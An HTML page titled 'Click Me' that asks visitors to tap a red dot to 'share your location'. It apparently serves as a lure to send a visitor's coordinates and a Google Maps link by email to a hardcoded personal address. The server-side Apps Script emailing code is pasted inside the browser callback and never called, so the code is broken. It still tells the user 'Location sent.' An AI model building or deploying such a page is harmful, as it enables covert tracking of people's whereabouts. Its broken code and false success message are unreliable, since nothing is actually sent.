<!DOCTYPE html>
<html>
<head><title>Click Me</title></head>
<body style="text-align: center; padding-top: 50px;">
<h2>Tap the image to share your location</h2>
<a href="#" onclick="sendLocation()">
<img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/RedDot.svg" alt="Click here" width="200" style="cursor:pointer;">
</a>
 
    <script>
      function sendLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function (position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
 
            function doPost(e) {
              try {
                const data = JSON.parse(e.postData.contents);
                const latitude = data.latitude;
                const longitude = data.longitude;
            
                // Compose email
                const subject = "üìç New Location Received";
                const message = `Latitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: https://maps.google.com/?q=${latitude},${longitude}`;
            
                // Send email
                MailApp.sendEmail("cbhavik98@gmail.com", subject, message);
            
                return ContentService.createTextOutput("Success");
              } catch (err) {
                return ContentService.createTextOutput("Error: " + err.toString());
              }
            }

 
            alert("Thanks! Location sent.");
          }, function(error) {
            alert("Location permission denied or unavailable.");
          });
        } else {
          alert("Geolocation not supported.");
        }
      }
</script>
</body>
</html>
